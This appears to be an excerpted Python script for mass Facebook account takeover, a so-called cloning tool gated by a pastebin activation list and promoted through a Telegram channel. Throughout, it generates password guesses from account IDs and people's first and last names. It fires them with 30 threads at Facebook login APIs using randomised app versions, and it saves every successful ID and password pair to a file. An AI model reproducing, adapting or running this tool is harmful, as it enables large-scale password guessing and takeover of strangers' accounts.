def sasuke():
    ...
    try:
        url = requests.get("https://pastebin.com/raw/sgg24ESx").text
    except requests.exceptions.ConnectionError:
        print('No Internet Connection')
    if id in url:
        print("\033[92m  YOUR ID IS ACTIVE.........\033[97m")
    elif id not in url:
        print('\033[0;91mYour Id Not Activate Send Chat To @i4m_narut0')
        exit()
...
os.system('xdg-open https://t.me/lNARUTO_KING')
...
logo=("""\033[93m]\x1b[1;91m
  ._   _          _____  _    _ _______ ____  
 | \ | |   /\   |  __ \| |  | |__   __/ __ \ 
 |  \| |  /  \  | |__) | |  | |  | | | |  | |
 | . ` | / /\ \ |  _  /| |  | |  | | | |  | |
 | |\  |/ ____ \| | \ \| |__| |  | | | |__| |
...
def public():
        ...
        try:
                ...
                try:
                        ...
                        ps_limit =1
                linex()
                print('\033[1;32m exp: 1234512345,11221122,123454321')
                linex()
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] File cloning\n [2] \033[93mPublic cloning')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' FILAKAT DANE NMUNA >  /sdcard/File.txt  etc..')
                                linex()
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: 1234554321,112233445?5,12131415,1122334412')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
...
def bd():
                ...
                with tred(max_workers=30) as SHAMI:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'kurdistan','kurd','i love you','iloveyou','hama hama','sero1234']
                                SHAMI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def gmail():
                ...
                with tred(max_workers=30) as SHAMI:
                        ...
                        for user in fo:
                                ...
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'1122334455',fs+'1234554321',fs+'11223344',fs,fs+'12341234',fs+'hama1234',fs+'12']
                                SHAMI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        pas = fikr.replace('hama1234',first).replace('zaxozaxo',last).replace('zaxo1234',ps).replace('adbulla123',ps2)
                        ...
                        if "c_user" in SHAMI:
                                ...
                                print('\r\r\033[1;32m NARUTO %s | %s'%(ids,pas))
...
def api(ids,names,passlist):
                try:
                        ...
                        try:
                                ...
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('2002',fn.lower()).replace('1234567',fn).replace('123456789',ln.lower()).replace('121212',ln).replace('hauler1234',names).replace('haulerhauler',names.lower())
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m NARUTO '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAMI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        try:
                                ...
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('alnd1234',fn.lower()).replace('alndalnd',fn).replace('@@',ln.lower()).replace('123@@',ln).replace('kurd@@',names).replace('hama@@',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m NARUTO '+uid+' | '+pas+'\033[1;97m')
